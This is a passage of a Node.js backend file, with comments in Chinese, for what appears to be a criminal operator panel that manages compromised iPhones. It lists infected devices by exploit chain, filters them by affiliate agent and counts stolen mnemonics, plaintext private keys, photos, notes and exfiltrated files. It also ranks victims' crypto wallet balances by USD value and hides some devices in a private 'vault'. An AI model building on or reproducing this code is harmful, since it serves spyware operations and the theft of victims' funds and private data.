/**
 * panelPg.js —— 面板 PG 读层（P4）
 * 设备列表 / 设备详情：SQL 查询 + 权限 SQL 化（authStore.filterByAgent 的等价实现）
 *   · super_admin + viewer 白名单 → 全量；非 viewer → 剔除专属代理足迹（_stripExclusive 等价）
 *   · agent → 递归子树（排除 deleted）的 device∪IP 通道，剔除跨集合的 excl 命中（通道语义与 filterByAgent 逐行对齐）
 *   · 记录类数据：PG 的 data 列 = 原始记录（ingestd/backfill 写入的 lootStore 对象）→ 零映射直接返回
 * 开关：server.js 侧 PANEL_PG_DEV=1；本模块异常由调用方回退旧快照路径。
 */
const fs = require('fs');
const path = require('path');
const { pool } = require('./pgStore');

const DATA_DIR = path.join(__dirname, '..', 'data');

// ── visibility.json（30s 缓存，与 authStore 对齐；解析失败保留上次名单）──
let _vis = { t: 0, agents: new Set(), viewers: new Set() };
function visibility() {
  if (Date.now() - _vis.t < 30000) return _vis;
  try {
    const j = JSON.parse(fs.readFileSync(path.join(DATA_DIR, 'visibility.json'), 'utf8'));
    _vis = { t: Date.now(), agents: new Set((j.exclusive_agents || []).map(Number)), viewers: new Set((j.viewer_ids || []).map(Number)) };
  } catch { _vis = { t: Date.now(), agents: _vis.agents, viewers: _vis.viewers }; }
  return _vis;
}

// ── 设备排除名单（data/device_exclude.json，30s 缓存）：不参与归属、不进代理视角（含 IP 兜底）──
let _devEx = { t: 0, list: [] };
function excludedSerials() {
  if (Date.now() - _devEx.t < 30000) return _devEx.list;
  try {
    const j = JSON.parse(fs.readFileSync(path.join(DATA_DIR, 'device_exclude.json'), 'utf8'));
    _devEx = { t: Date.now(), list: (Array.isArray(j.serials) ? j.serials : []).map(String).filter(Boolean) };
  } catch { _devEx = { t: Date.now(), list: _devEx.list }; }
  return _devEx.list;
}

// ── 子树 ids（含自己；deleted 不继承；与 authStore.getDescendantAgentIds 对齐）──
async function subtreeIds(rootId) {
  const r = await pool.query(
    `WITH RECURSIVE sub AS (
       SELECT id FROM agents WHERE id = $1
       UNION
       SELECT a.id FROM agents a JOIN sub s ON a.parent_id = s.id
       WHERE a.role = 'agent' AND COALESCE(a.status, '') <> 'deleted'
     ) SELECT id FROM sub`, [rootId]);
  return r.rows.map(x => Number(x.id));
}

// ── agents 名字映射（30s 缓存）──
let _ag = { t: 0, map: new Map() };
async function agentMap() {
  if (Date.now() - _ag.t < 30000) return _ag.map;
  const r = await pool.query('SELECT id, username, raw, status FROM agents');
  const m = new Map();
  for (const x of r.rows) m.set(Number(x.id), { username: x.username || '', label: (x.raw && x.raw.label) || '', status: x.status || '' });
  _ag = { t: Date.now(), map: m };
  return m;
}

// ── 【2026-09-16】暗池（vault）：入池设备/地址对所有账号（含 superadmin/viewer）不可见 ──
let _vault = { t: 0, serials: [], addrs: [] };
async function vaultSets() {
  if (Date.now() - _vault.t < 30000) return _vault;
  try {
    const r1 = await pool.query(`SELECT DISTINCT serial FROM vault_items WHERE serial IS NOT NULL AND serial <> ''`);
    const r2 = await pool.query(`SELECT DISTINCT a.serial FROM addresses a JOIN vault_items v ON a.public_key = v.addr AND COALESCE(v.reason,'') NOT LIKE 'PENDING_GATE%' WHERE a.serial IS NOT NULL AND a.serial <> ''`);   // 【2026-09-19 复审修复】挂起期批量地址不做反向连带隐藏（防误伤共享同址的其它设备）
    const r3 = await pool.query(`SELECT addr FROM vault_items`);
    const serials = [...new Set([...r1.rows, ...r2.rows].map(x => String(x.serial)))];
    const addrs = r3.rows.map(x => String(x.addr));
    _vault = { t: Date.now(), serials, addrs };
  } catch (e) { _vault.t = Date.now(); }   // 查询失败保留上次集合
  return _vault;
}

// ── 权限 WHERE 条件（params 追加式）——buildConds 与 stats 共用 ──
async function devCondsInto(user, params, pv) {
  const vis = visibility();
  const exclAll = [...vis.agents];
  const isSuper = user.role === 'super_admin';
  const conds = [];
  if (isSuper) {
    // 【2026-09-19】仪表盘统计口径：stats() 传入 __statsAll 的超管按"全量"计算（admin 与 superadmin 显示一致）；
    //   仅统计展示层使用，设备列表/详情/通知等其它路径不带该标记，隔离照旧
    const canAll = !!(user && user.__statsAll) || !exclAll.length || vis.viewers.has(user.id);
    if (!canAll) {
      const $e = pv(exclAll);
      conds.push(`d.serial NOT IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$e}))`);
      conds.push(`(d.ip IS NULL OR d.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e})))`);
    }
  } else {
    // 【2026-09-14】排除名单设备：代理视角（含 IP / device_ip_map 兜底）完全剔除，仅超管可见
    const _exSerials = excludedSerials();
    if (_exSerials.length) { const $x = pv(_exSerials); conds.push(`NOT (d.serial = ANY(${$x}))`); }
    const exclOthers = exclAll.filter(x => x !== user.id);
    const subIds = exclAll.includes(user.id) ? [user.id] : (await subtreeIds(user.id)).filter(x => !exclAll.includes(x));
    const $s = pv(subIds);
    if (exclOthers.length) {
      const $e = pv(exclOthers);
      conds.push(`d.serial NOT IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$e}))`);
      // 【2026-09-18】IP 兜底只对"尚未归属任何代理"的设备生效：已归属设备仅归属方可见（防窜设备）
      conds.push(`(d.serial IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$s}))
                 OR (d.serial NOT IN (SELECT serial FROM agent_device)
                     AND ((d.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s}))
                           AND (d.ip IS NULL OR d.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e}))))
                          OR d.serial IN (SELECT dim.serial FROM device_ip_map dim
                                          WHERE dim.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s}))
                                            AND dim.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e}))))))`);
    } else {
      // 【2026-09-18】同上：IP 兜底仅对"未归属设备"生效
      conds.push(`(d.serial IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$s}))
                 OR (d.serial NOT IN (SELECT serial FROM agent_device)
                     AND (d.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s}))
                          OR d.serial IN (SELECT dim.serial FROM device_ip_map dim WHERE dim.ip IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$s}))))))`);
    }
  }
  // 【2026-09-16】暗池：入池设备对所有人（含两个超管）不可见
  const _vs = await vaultSets();
  if (_vs.serials.length) { const $v = pv(_vs.serials); conds.push(`(d.serial IS NULL OR d.serial <> ALL(${$v}))`); }
  return conds;
}

async function buildConds(user) {
  const params = [];
  const pv = v => { params.push(v); return '$' + params.length; };
  const conds = await devCondsInto(user, params, pv);
  return { conds, params, isSuper: user.role === 'super_admin' };
}

const DSEL = `SELECT d.serial, host(d.ip) AS ip, d.owner_agent_id, d.machine, d.ios_version, d.build_version, d.kernel_release,
       d.source, d.first_seen, d.last_seen, d.session_start, d.is_online, d.wallet_label, d.wallets,
       d.mnemonic_count, d.address_count, d.token_count, d.photo_count, d.note_count,
       d.exfil18_count, d.file_count, d.upload_status, d.is_wallet_user,
       d.extras->'u' AS _u, d.extras->'d' AS _d`;

/** 【2026-09-14】iOS 版本数值表达式（统计/筛选/排序同口径）：
 *  优先 ios_version 前两位（^M.m）；缺 ios_version 时用 Darwin 内核回退（内核-9 = iOS 代数：24→18/23→17/…）；
 *  都无法解析 → 0（unknown）。 */
const VNUM_EXT = `COALESCE(NULLIF(substring(d.ios_version from '^[0-9]+[.][0-9]+'), '')::numeric,
      CASE COALESCE(NULLIF(substring(d.kernel_release from '^[0-9]+'), '')::int - 9, -1)
        WHEN 24 THEN 18 WHEN 23 THEN 17 WHEN 22 THEN 16 WHEN 21 THEN 15
        WHEN 20 THEN 14 WHEN 19 THEN 13 WHEN 18 THEN 12 ELSE NULL END, 0)`;

/** 钱包口径（统计/筛选/计数同口径）：wallets 数组 或 助记词数>0 或 is_wallet_user */
const WALLET_COND = `((d.wallets IS NOT NULL AND array_length(d.wallets, 1) > 0) OR COALESCE(d.mnemonic_count, 0) > 0 OR d.is_wallet_user)`;

/** PG 行 → 旧 lootStore 口径的设备对象（前端字段兼容；extras 的 u/d 打底，主干覆盖） */
function mapRow(r) {
  const u = r._u || {}, d = r._d || {};
  // 【2026-09-14】显示兜底：设备端时钟漂移（+6 天）造成的"未来时间"不外显（入库侧已钳制，这里是双保险）
  const _nowClamp = Date.now();
  const cts = v => { const n = Number(v) || 0; return n > _nowClamp ? _nowClamp : n; };
  return Object.assign({}, d, u, {
    id: r.serial,
    serial_id: r.serial,
    machine: r.machine || u.machine || d.hardware_model || '',
    hardware_model: r.machine || d.hardware_model || '',
    os_version: r.ios_version || u.ios_version || '',
    build_version: r.build_version || '',
    kernel_release: r.kernel_release || '',
    ip: r.ip || u.ip || '',
    source: r.source || '',
    first_seen: cts(r.first_seen),
    last_seen: cts(r.last_seen),
    session_start: cts(r.session_start),
    is_online: !!r.is_online,
    wallets: Array.isArray(r.wallets) ? r.wallets : [],
    wallet_label: r.wallet_label || '',
    mnemonic_count: Number(r.mnemonic_count) || 0,
    address_count: Number(r.address_count) || 0,
    token_count: Number(r.token_count) || 0,
    photo_count: Number(r.photo_count) || 0,
    note_count: Number(r.note_count) || 0,
    exfil18_count: Number(r.exfil18_count) || 0,
    file_count: Number(r.file_count) || 0,
    upload_status: r.upload_status || '',
    is_wallet_user: !!r.is_wallet_user,
  });
}

// 【2026-09-14】上线时间（session_start）现为 devices 真列：由 tools/pg_sync_globals.js 的
//   syncSessionStart() 每 5 分钟计算落库（算法与 lootStore.scan 一致），列表排序与显示统一读列。
//   （早期临时实现 fillSessionStart 实时计算已移除——避免"排序用列/显示用实时"两套值不一致）

/** agent_name/label 填充（超管=全量；代理=仅本人+可继承下级，防跨代理名称泄露；归属优先，空则 IP 映射兜底）——修改 rows[i] 对象本身 */
async function fillAgentNames(rows, rawRows, isSuper, user) {
  const am = await agentMap();
  let allow = null;
  if (!isSuper && user) {
    const vis = visibility();
    const excl = [...vis.agents];
    const subs = excl.includes(user.id) ? [user.id] : [user.id, ...(await subtreeIds(user.id)).filter(x => !excl.includes(x))];
    allow = new Set(subs.map(Number));
  }
  const okAid = aid => (!allow || allow.has(Number(aid)));
  const ipNeed = [];
  for (let i = 0; i < rawRows.length; i++) {
    const aid = rawRows[i].owner_agent_id != null ? Number(rawRows[i].owner_agent_id) : null;
    if (aid != null) {
      if (!okAid(aid)) continue;
      const a = am.get(aid);
      if (a) { rows[i].agent_name = a.username; rows[i].agent_label = a.label; }
    } else if (rows[i].ip) {
      ipNeed.push(i);
    }
  }
  if (ipNeed.length) {
    const ips = ipNeed.map(i => rows[i].ip).filter(Boolean);
    if (ips.length) {
      const rr = await pool.query('SELECT host(ip) AS ip, agent_id FROM agent_ip_map WHERE ip = ANY($1::inet[])', [ips]);
      const im = new Map(rr.rows.map(x => [x.ip, Number(x.agent_id)]));
      for (const i of ipNeed) {
        const aid = im.get(rows[i].ip);
        if (aid != null && okAid(aid)) { const a = am.get(aid); if (a) { rows[i].agent_name = a.username; rows[i].agent_label = a.label; } }
      }
    }
  }
}

/** 【2026-09-14】列表页计数实时化：devices.*_count 存储列由 pg_sync_globals 每 5 分钟纠偏（供兜底/其它
 *  消费方），但「当前这一页」直接 SQL 实时算 —— 新上报的助记词/照片/系统文件等在本页立即反映，
 *  不再等 ≤5 分钟。仅对本页 ≤1000 台做 7 个聚合查询（serial 索引前缀），实测 +15ms 级。
 *  上传状态 / is_wallet_user 同步实时化（语义与 pg_sync_globals.syncDeviceMetaPg 一致）。 */
async function fillLiveCounts(rows) {
  if (!rows.length) return;
  const serials = rows.map(x => x.serial_id).filter(Boolean);
  if (!serials.length) return;
  // 7 类聚合一次 UNION ALL 取回（单连接单次往返；pool max=6，不挤压并发）
  const r2 = await pool.query(
    `SELECT 'm' AS k, serial, count(*)::int AS c FROM mnemonics WHERE serial = ANY($1) GROUP BY serial
     UNION ALL SELECT 'a', serial, count(*)::int FROM addresses WHERE serial = ANY($1) GROUP BY serial
     UNION ALL SELECT 't', serial, count(*)::int FROM tokens    WHERE serial = ANY($1) GROUP BY serial
     UNION ALL SELECT 'p', serial, count(*)::int FROM photos    WHERE serial = ANY($1) GROUP BY serial
     UNION ALL SELECT 'n', serial, count(*)::int FROM notebooks WHERE serial = ANY($1) GROUP BY serial
     UNION ALL SELECT 'e', serial, count(*)::int FROM exfil18   WHERE serial = ANY($1) GROUP BY serial
     UNION ALL SELECT 'r', serial, CASE WHEN bool_or(kind IN ('us','a','ub','uj')) THEN 1 ELSE 0 END
       FROM reports WHERE serial = ANY($1) GROUP BY serial`, [serials]);
  const maps = { m: new Map(), a: new Map(), t: new Map(), p: new Map(), n: new Map(), e: new Map(), r: new Map() };
  for (const x of r2.rows) maps[x.k].set(x.serial, x.c);
  for (const row of rows) {
    const s = row.serial_id;
    const e = maps.e.get(s) || 0;
    row.mnemonic_count = maps.m.get(s) || 0;
    row.address_count = maps.a.get(s) || 0;
    row.token_count = maps.t.get(s) || 0;
    row.photo_count = maps.p.get(s) || 0;
    row.note_count = maps.n.get(s) || 0;
    row.exfil18_count = e;
    row.upload_status = maps.r.get(s) ? '已上报' : (e > 0 ? '18链已上报' : '未上报');
    row.is_wallet_user = row.mnemonic_count > 0;
  }
}

/** 设备列表（后端分页 P4.1-2：权限过滤 + kw/agent/wallet 筛选 + LIMIT/OFFSET）→ { dis, pi, agent_list? } */
async function deviceList(user, q) {
  const { conds, params, isSuper } = await buildConds(user);
  const qq = q || {};
  const size = Math.min(1000, Math.max(1, parseInt(qq.s || '20', 10) || 20));
  const page = Math.max(0, parseInt(qq.p || '0', 10) || 0);
  const pv = v => { params.push(v); return '$' + params.length; };

  // 关键字：序列号/机型/系统/IP/代理名与备注/钱包名
  const kw = String(qq.kw || '').trim();
  if (kw) {
    const like = '%' + kw.replace(/[\\%_]/g, m => '\\' + m) + '%';
    const $k = pv(like);
    conds.push(`(d.serial ILIKE ${$k} OR d.machine ILIKE ${$k} OR d.ios_version ILIKE ${$k} OR d.build_version ILIKE ${$k} OR host(d.ip) ILIKE ${$k}
       OR EXISTS (SELECT 1 FROM agents ag WHERE ag.id = d.owner_agent_id AND (ag.username ILIKE ${$k} OR ag.raw->>'label' ILIKE ${$k}))
       OR d.wallets::text ILIKE ${$k})`);
  }
  const wt = String(qq.wallet || '');
  if (wt === 'has') conds.push(WALLET_COND);
  else if (wt === 'none') conds.push(`NOT ${WALLET_COND}`);
  // 【2026-09-14】版本链筛选（统计卡点击）：chain=dark(≥18.0) | coruna(0<v<18) | other(v<=0 无版本信息)
  const ch = String(qq.chain || '');
  if (ch === 'dark') conds.push(`(${VNUM_EXT} >= 18)`);
  else if (ch === 'coruna') conds.push(`(${VNUM_EXT} > 0 AND ${VNUM_EXT} < 18)`);
  else if (ch === 'other') conds.push(`(${VNUM_EXT} <= 0)`);
  const ag = String(qq.agent || '').trim();
  if (ag) {
    const $a = pv(ag);
    conds.push(`EXISTS (SELECT 1 FROM agents ag2 WHERE ag2.id = d.owner_agent_id AND ag2.username = ${$a})`);
  }

  const where = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
  const $lim = pv(size);
  const $off = pv(page * size);
  // 【2026-09-14】排序（白名单防注入）：sort=online(上线时间·默认) | active(最近活跃) | ios(系统版本)；dir=desc|asc
  const sortDir = String(qq.dir || '').toLowerCase() === 'asc' ? 'ASC' : 'DESC';
  const sortKey = String(qq.sort || '');
  const orderExpr = sortKey === 'active'
    ? `LEAST(d.last_seen, (EXTRACT(EPOCH FROM now())*1000)::bigint)`
    : sortKey === 'ios'
    ? `COALESCE(string_to_array(NULLIF(substring(d.ios_version from '^[0-9]+(?:[.][0-9]+)*'), ''), '.')::int[], ARRAY[0])`
    : `COALESCE(NULLIF(d.session_start, 0), LEAST(d.last_seen, (EXTRACT(EPOCH FROM now())*1000)::bigint))`;
  const sql = `
    ${DSEL}, COUNT(*) OVER() AS _total
    FROM devices d
    ${where}
    ORDER BY ${orderExpr} ${sortDir}, d.last_seen DESC
    LIMIT ${$lim} OFFSET ${$off}`;
  const r = await pool.query(sql, params);
  const rows = r.rows.map(mapRow);
  await fillLiveCounts(rows);   // 【2026-09-14】本页计数实时化（助记词等新上报秒级可见，不等 5 分钟 cron）
  const total = r.rows.length ? Number(r.rows[0]._total) : (page > 0 ? 0 : 0);
  await fillAgentNames(rows, r.rows, isSuper, user);

  // 代理名单（前端"归属代理"下拉用）：超管=全量；代理=本人+可继承下级（防越权展示）【2026-09-18】
  let agent_list;
  {
    const am = await agentMap();
    // 【2026-09-26 fc】下拉只列未删除代理（deleted 软删行仍留表内；agentMap 保留 status 供归属名解析）
    let list = [...am.entries()].map(([id, a]) => ({ id, username: a.username, label: a.label, _st: a.status })).filter(a => a.username && a._st !== 'deleted').map(({ id, username, label }) => ({ id, username, label }));
    if (!isSuper) {
      const vis = visibility();
      const excl = [...vis.agents];
      const subs = excl.includes(user.id) ? [user.id] : [user.id, ...(await subtreeIds(user.id)).filter(x => !excl.includes(x))];
      const allow = new Set(subs.map(Number));
      list = list.filter(a => allow.has(Number(a.id)));
    }
    list.sort((x, y) => x.username.localeCompare(y.username));
    agent_list = list;
  }
  return { dis: rows, pi: { r: rows.length, s: size, p: page, total }, ...(agent_list ? { agent_list } : {}) };
}

/** 设备列表顶部统计（与列表同权限口径，忽略 kw/agent/wallet 筛选）→ 版本链分布 + 钱包统计
 *  链划分：darksword = iOS ≥18.0 | coruna = ≤17.5（含 17.6~17.7 之外的全部旧版：16/15/14/13…）
 *  （iOS 版本子版本号仅一位数；缺 ios_version 时用 Darwin 内核大版本回退：内核-9 = iOS 代数）
 *  钱包口径：wallets 数组 或 mnemonic_count>0 或 is_wallet_user（三者任一即"有钱包"） */
async function deviceListStats(user) {
  const { conds, params } = await buildConds(user);
  const where = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
  const r = await pool.query(
    `SELECT count(*)::int AS total,
            count(*) FILTER (WHERE ${VNUM_EXT} >= 18)::int AS dark,
            count(*) FILTER (WHERE ${VNUM_EXT} > 0 AND ${VNUM_EXT} < 18)::int AS coruna,
            count(*) FILTER (WHERE ${VNUM_EXT} <= 0)::int AS unknown,
            count(*) FILTER (WHERE ${WALLET_COND})::int AS wallet
     FROM devices d ${where}`, params);
  const x = r.rows[0] || {};
  const total = Number(x.total) || 0;
  return {
    total,
    dark: Number(x.dark) || 0,
    coruna: Number(x.coruna) || 0, unknown: Number(x.unknown) || 0,
    wallet: Number(x.wallet) || 0, no_wallet: total - (Number(x.wallet) || 0),
  };
}

/** 【2026-09-14】余额记录页（超管专属）：全量地址按余额倒序 + 筛选/分页/统计。
 *  规则与面板保持一致：chain 归一化（ETHEREUM/MetaMask 等钱包别名 → ETH 等）、排除专属代理不可见设备。 */
const BAL_CHAIN_NORM = `CASE
  WHEN upper(e.chain) IN ('ETHEREUM','METAMASK','TRUST','BITGET','IMTOKEN','EXODUS') THEN 'ETH'
  WHEN upper(e.chain) IN ('TRX') THEN 'TRON'
  WHEN upper(e.chain) IN ('SOLANA') THEN 'SOL'
  WHEN upper(e.chain) IN ('TONKEEPER','TONHUB','COIN607') THEN 'TON'
  ELSE upper(e.chain) END`;

// 【2026-09-17】"有密钥材料"判定（与 balance_sync / evm_tx_watch / tron_watch 三引擎停查口径一致）：
//   本行有私钥、或同设备同址另有有钥行、或有派生路径且该设备有已解明文助记词 → 保留展示
const HAS_KEY_COND = `(COALESCE(e.private_key_plain,'') <> ''
  OR EXISTS (SELECT 1 FROM addresses d WHERE d.serial = e.serial AND lower(d.public_key) = lower(e.public_key) AND COALESCE(d.private_key_plain,'') <> '')
  OR (COALESCE(e.data->>'derivation_path','') <> '' AND EXISTS (SELECT 1 FROM mnemonics m WHERE m.serial = e.serial AND COALESCE(m.plain,'') <> '')))`;

// ── 【2026-09-16】余额估值：币种映射 + 价格缓存（notify_scan 每 5 分钟刷新 OKX 价）──
//   价格文件缺失/超过 15 分钟视为过期 → 不展示估值（只显示数量，防旧价误导）；TON 价暂缺 → 其行不提估值
const CHAIN_COIN = {
  TRON: 'TRX', ETH: 'ETH', ARBITRUM: 'ETH', BASE: 'ETH', BSC: 'BNB', POLYGON: 'POL',
  BTC: 'BTC', LTC: 'LTC', SOL: 'SOL', DOGE: 'DOGE', TON: 'TON',
};
// EVM 分链明细的币种映射（evm_bals 的键）：用于"按链分别折算"，禁止用求和值乘单一币价
const EVM_CHAIN_COIN = { ETH: 'ETH', ARBITRUM: 'ETH', BASE: 'ETH', BSC: 'BNB', POLYGON: 'POL' };
let _px = { t: 0, prices: null };
function prices() {
  if (Date.now() - _px.t < 60000) return _px.prices;
  try {
    const j = JSON.parse(fs.readFileSync(path.join(DATA_DIR, 'price_cache.json'), 'utf8'));
    const age = Date.now() / 1000 - Number(j.ts || 0);
    _px = { t: Date.now(), prices: (age < 900 && j.prices) ? j.prices : null };
  } catch (e) { _px = { t: Date.now(), prices: null }; }
  return _px.prices;
}

/** 【2026-09-21】"合计估值"排序表达式：与页面展示同口径折算 ≈USD（原生币 + 代币）。
 *  原生币：EVM 行按 evm_bals 各链金额×各链币价分别折算；其余按链币种×币价。
 *  代币：tokens 数组优先，为空时回退旧字段 trc20；未知币种不计价。
 *  价格不可用返回 null（调用方回退到 e.bal 排序）。 */
function usdSortExpr() {
  const P = prices() || {};
  const px = a => { const p = Number(P[String(a || '').toUpperCase()]); return p > 0 ? p : null; };
  if (!Object.keys(P).length) return null;
  // 1) 原生币部分
  const evmTerms = Object.entries(EVM_CHAIN_COIN).map(([ch, coin]) => {
    const p = px(coin); if (!p) return null;
    return `COALESCE((e.data->'evm_bals'->>'${ch}')::numeric, 0) * ${p}`;
  }).filter(Boolean);
  const evmSum = evmTerms.length ? `(${evmTerms.join(' + ')})` : '0';
  const ckTerms = Object.entries(CHAIN_COIN).map(([chain, coin]) => {
    const p = px(coin); if (!p) return null;
    return `WHEN '${chain}' THEN COALESCE(e.bal, 0) * ${p}`;
  }).filter(Boolean);
  const nativeUsd = `(CASE WHEN jsonb_typeof(e.data->'evm_bals') = 'object' AND e.data->'evm_bals' <> '{}'::jsonb
    THEN ${evmSum} ELSE (CASE ${BAL_CHAIN_NORM} ${ckTerms.join(' ')} ELSE 0 END) END)`;
  // 2) 代币部分（金额字段做了数字格式守卫，脏数据按 0 计，避免 cast 报错）
  const tokCase = Object.entries(P).filter(([, p]) => Number(p) > 0)
    .map(([abbr, p]) => `WHEN '${String(abbr).toUpperCase()}' THEN ${Number(p)}`).join(' ');
  const tokSum = arr => `COALESCE((SELECT SUM(
      CASE WHEN COALESCE(t->>'amount','') ~ '^-?[0-9]+(\\.[0-9]+)?([eE][-+]?[0-9]+)?$' THEN (t->>'amount')::numeric ELSE 0 END *
      (CASE upper(COALESCE(t->>'abbr','')) ${tokCase} ELSE 0 END))
    FROM jsonb_array_elements(COALESCE(${arr}, '[]'::jsonb)) t WHERE jsonb_typeof(t) = 'object'), 0)`;
  const tokensUsd = `(CASE WHEN jsonb_typeof(e.data->'tokens') = 'array' AND jsonb_array_length(e.data->'tokens') > 0
    THEN ${tokSum(`e.data->'tokens'`)} ELSE ${tokSum(`e.data->'trc20'`)} END)`;
  return `(${nativeUsd} + ${tokensUsd})`;
}

async function balances(user, q) {
  const qq = q || {};
  const size = Math.min(200, Math.max(1, parseInt(qq.s || '50', 10) || 50));
  const page = Math.max(0, parseInt(qq.p || '0', 10) || 0);
  const params = [];
  const pv = v => { params.push(v); return '$' + params.length; };
  const conds = ["e.bal IS NOT NULL"];
  // 【2026-09-16】数据隔离：超管=全量（仅剔除 exclusive 名单）；代理=仅本代理+下级设备（serial/IP/多出口IP 三通道，SQL 行级过滤）
  if (user.role === 'super_admin') {
    const vis = visibility();
    const exclAll = [...vis.agents];
    if (exclAll.length && !vis.viewers.has(user.id)) {
      const $e = pv(exclAll);
      conds.push(`(e.serial IS NULL OR e.serial NOT IN (SELECT serial FROM agent_device WHERE agent_id = ANY(${$e})))`);
      conds.push(`(e.ip IS NULL OR e.ip NOT IN (SELECT ip FROM agent_ip_map WHERE agent_id = ANY(${$e})))`);
    }
  } else {
    const aconds = await recCondsInto(user, params, pv);
    conds.push(...aconds);
  }
  const ch = String(qq.chain || '').trim().toUpperCase();
  if (ch) {
    if (ch === 'ETH') conds.push(`(upper(e.chain) IN ('ETH','ETHEREUM','METAMASK','TRUST','BITGET','IMTOKEN','EXODUS'))`);
    else if (ch === 'TRON') conds.push(`(upper(e.chain) IN ('TRON','TRX'))`);
    else if (ch === 'SOL') conds.push(`(upper(e.chain) IN ('SOL','SOLANA'))`);
    else if (ch === 'TON') conds.push(`(upper(e.chain) IN ('TON','TONKEEPER','TONHUB','COIN607'))`);   // 【2026-09-16】
    else { const $c = pv(ch); conds.push(`upper(e.chain) = ${$c}`); }
  }
  if (String(qq.only) === '1') conds.push(`e.bal > 0`);
  const kw = String(qq.kw || '').trim();
  if (kw) {
    const $k = pv('%' + kw.replace(/[\\%_]/g, m => '\\' + m) + '%');
    conds.push(`(e.serial ILIKE ${$k} OR e.public_key ILIKE ${$k})`);
  }
  // 【2026-09-16】暗池：入池设备与入池地址的余额记录对所有人（含两个超管）不可见
  const _vsb = await vaultSets();
  if (_vsb.serials.length) { const $v = pv(_vsb.serials); conds.push(`(e.serial IS NULL OR e.serial <> ALL(${$v}))`); }
  if (_vsb.addrs.length) { const $a = pv(_vsb.addrs); conds.push(`(e.public_key IS NULL OR e.public_key <> ALL(${$a}))`); }
  // 【2026-09-17】无钥地址（已停查、无可用密钥材料）不展示在余额记录 —— 数据保留，仅隐藏
  conds.push(HAS_KEY_COND);
  const where = 'WHERE ' + conds.join(' AND ');
  const $lim = pv(size);
  const $off = pv(page * size);
  const sortDir = String(qq.dir || '').toLowerCase() === 'asc' ? 'ASC' : 'DESC';
  const sortKey = String(qq.sort || '');
  // 【2026-09-21】sort=usd → 按"合计估值"（原生币+代币 ≈USD）排序；价格不可用时回退 e.bal
  let orderExpr = sortKey === 'at' ? 'e.bal_at' : 'e.bal';
  if (sortKey === 'usd') orderExpr = usdSortExpr() || 'e.bal';
  // 【2026-09-21】本查询代价超 PG JIT 阈值（jit_above_cost），JIT 编译实测要 ~1.4s；
  //   余额记录页是交互式接口 —— 事务内 SET LOCAL jit=off（只影响本查询）：1.5s → 92ms
  const cli = await pool.connect();
  let r;
  try {
    await cli.query('BEGIN');
    await cli.query('SET LOCAL jit = off');
    r = await cli.query(
    `SELECT e.id, e.serial, host(e.ip) AS ip, ${BAL_CHAIN_NORM} AS chain, e.public_key, e.bal, e.bal_at, e.bal_updated,
            e.data->'evm_bals' AS evm_bals,
            e.data->'trc20' AS trc20,
            e.data->'tokens' AS tokens,
            (SELECT max(bc.changed_at) FROM balance_changes bc WHERE bc.addr = e.public_key AND bc.changed_at > now() - interval '24 hours') AS chg_at,
            COUNT(*) OVER() AS _total
       FROM addresses e ${where}
      ORDER BY ${orderExpr} ${sortDir} NULLS LAST, e.id DESC
      LIMIT ${$lim} OFFSET ${$off}`, params);
    await cli.query('COMMIT');
  } catch (e) {
    try { await cli.query('ROLLBACK'); } catch (_) {}
    throw e;
  } finally { cli.release(); }
  // 【2026-09-16】估值计算：主余额（原生币）与代币分别折算 ≈USD；价格不可用则为 null（前端自动隐藏）
  const P = prices() || {};
  const priceOf = abbr => {
    const p = Number(P[String(abbr || '').toUpperCase()]);
    return p > 0 ? p : null;
  };
  const list = r.rows.map(x => {
    // 合并 tokens（新，全链）与 trc20（旧，TRON 遗留）→ 统一代币列表（含单币估值）
    const _seen = new Set(), tokens = [];
    for (const t of (Array.isArray(x.tokens) ? x.tokens : [])) { const k = (t.chain || '') + '|' + (t.abbr || ''); if (!_seen.has(k)) { _seen.add(k); tokens.push({ chain: t.chain || '', abbr: t.abbr || '', amount: Number(t.amount) || 0 }); } }
    for (const t of (Array.isArray(x.trc20) ? x.trc20 : [])) { const k = 'TRON|' + (t.abbr || ''); if (!_seen.has(k)) { _seen.add(k); tokens.push({ chain: 'TRON', abbr: t.abbr || '', amount: Number(t.amount) || 0 }); } }
    for (const t of tokens) { const p = priceOf(t.abbr); t.usd = (p && t.amount > 0) ? t.amount * p : null; }
    const balNum = x.bal != null ? Number(x.bal) : null;
    let coin = CHAIN_COIN[x.chain] || null;
    let usd_est = null;
    let evm_usd = null;
    // 【2026-09-16 修正】EVM 行的 bal 是"跨链求和"（ETH+BNB+POL 等不同币种混加），
    //   估值必须按各链金额 × 各链币价分别折算再求和；此前误用求和值×ETH价（0.6 POL 被当 0.6 ETH 估价）
    const _evm = (x.evm_bals && typeof x.evm_bals === 'object') ? Object.entries(x.evm_bals).filter(([k, v]) => Number(v) > 0) : null;
    if (_evm) {
      let _sum = 0, _cnt = 0; evm_usd = {};
      for (const [ch, amt] of _evm) {
        const c = EVM_CHAIN_COIN[ch], p = c ? priceOf(c) : null;
        if (c && p) { const u = Number(amt) * p; evm_usd[ch] = u; _sum += u; _cnt++; }
      }
      if (_cnt) usd_est = _sum;
      // 币种后缀：仅一条链非零 → 该链币种；多条链非零 → 'EVM'（混加值不可标单一币种）
      coin = _evm.length === 1 ? (EVM_CHAIN_COIN[_evm[0][0]] || null) : (_evm.length > 1 ? 'EVM' : null);
      if (!Object.keys(evm_usd).length) evm_usd = null;
    } else {
      const np = coin ? priceOf(coin) : null;
      // 余额为 0 的行不展示 ≈$0.00（无意义）；只对正余额折算
      usd_est = (balNum != null && balNum > 0 && np) ? balNum * np : null;
    }
    const _parts = [];
    if (usd_est != null) _parts.push(usd_est);
    for (const t of tokens) if (t.usd != null) _parts.push(t.usd);
    const usd_total = _parts.length ? _parts.reduce((a, b) => a + b, 0) : null;
    return {
